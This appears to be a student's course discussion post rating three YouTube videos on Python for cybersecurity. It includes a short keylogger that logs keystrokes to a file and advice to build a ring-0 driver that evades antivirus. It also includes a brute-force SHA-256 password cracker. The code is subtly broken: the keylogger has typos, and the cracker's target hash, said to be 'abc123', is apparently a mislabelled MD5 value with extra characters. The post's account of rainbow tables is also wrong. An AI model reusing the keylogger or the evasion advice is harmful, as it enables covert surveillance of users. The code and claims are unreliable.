# W03 Discussion: Module 4 Cybersecurity Videos

## Python Key Logger
[Python Keylogger](https://youtu.be/mDY3v2Xx-Q4)

I chose three videos on Python and Cybersecurity instead of two from YouTube. The first video showed how to write a keylogger in Python. Interestingly, the presenter only needed 14 lines of code; however, the logger was not very stealthy.

The best way to deploy key-logging software is to write a driver that can be placed in the operating system's ring-0, bypassing antivirus and antispyware programs. The driver would have to be written in C instead of Python to execute as a driver, say, on Windows.

Score: 8:10

``` python
#!/usr/env python

from pyniput import keyboard

def keyPressed(key):
    print(str(key))
    with open("keyfile.txt", 'a') as logKey:
        try:
            char - key.char
            logKey.write(char)
        except:
            print("Error fetching the key")

if __name__=="__main__":
    listener = keyboard.listener(on_press=keyPressed)
    listener.start()
    input()
```

## Top 14 Python Libraries for Cybersecurity
[Top 14 Python Libraries for Cybersecurity](https://youtu.be/kUOx6klu170)

The second video needed more technical content. It acted more like a commercial for 14 of the top libraries used by cybersecurity professionals. It had an excellent music track in the background, but that could be its best attribute.

Score 5:10

## Python Cybersecurity Projects
[10 Python Cybersecurity Projects - Beginner to Advanced](https://youtu.be/kf1Zzcj2gV8)
    **01. Python Cybersecurity— Network Tracking using Wireshark and Google Maps:**
    **02. Python Cybersecurity - Nmap and Python Scripting (Information Gathering):** [Module 2](https://youtu.be/UZ6VDgTm3vw)
    **03. Python Cybersecurity For Beginners — Build Anonymous FTP Scanner**
    **04. Python Cybersecurity — How To Crack Passwords (Dictionary Attack)**
    **05. Python Cybersecurity — Find Deleted Files**
    **06. Python Cybersecurity — Zip File Password Cracker** [Module 6]()
    **07. Python Cybersecurity — Brute Force FTP**
    **08. Python Cybersecurity Project For Beginners - Build a Port Scanner**
    **09. Spam Detection using Machine Learning**
    **10. Python Algorithmic Trading In 8 Minutes 🔥 Fetch Stocks(Xpeng & Apple)**

The third video was an index to several more videos. I liked this video and followed a couple of the videos: the zip file cracker and Nmap. I thought this "series" was incredible.

Score 10:10

### The code for nmap and python
[python and nmap](https://github.com/nmmapper/python3-nmap)

### The code for zip cracking
[Python Cybersecurity Project -Zip File Password Cracker](https://youtu.be/NZp5O11qdwg)
- Side note: The presenter uses a rainbow table to crack. In my book that's not really cracking. However, it is clever if your password file is large enough. Rainbow tables are nice but they can't do much more than create a hash from the word list and compare that hash with the password mask. If they match violá. A better approach would be something like this:

``` python
import hashlib
import itertools
import string
import time

# Hash of the password we want to crack (for example, 'abc123' hashed with SHA-256)
target_hash = "e99a18c428cb38d5f260853678922e03abd83308d8c7c2822f5d09c3c840bde5"

# Character set (you can add uppercase letters, special characters, etc.)
charset = string.ascii_lowercase + string.digits

# Length of the password (in this example, we'll brute-force passwords of length 6)
password_length = 6

def generate_passwords(charset, length):
    """Generate all possible combinations of a given charset up to a certain length"""
    return itertools.product(charset, repeat=length)

def crack_password(target_hash, charset, length):
    """Attempt to brute-force a password by comparing hashed versions"""
    for attempt in generate_passwords(charset, length):
        attempt_password = ''.join(attempt)
        # Hash the current attempt using SHA-256
        hashed_attempt = hashlib.sha256(attempt_password.encode()).hexdigest()
        
        if hashed_attempt == target_hash:
            print(f"Password cracked! The password is: {attempt_password}")
            return attempt_password
        
    print("Password not found within the specified parameters.")
    return None

# Start the brute force attack
start_time = time.time()
crack_password(target_hash, charset, password_length)
end_time = time.time()

# Output the time taken
print(f"Time taken: {end_time - start_time} seconds")
```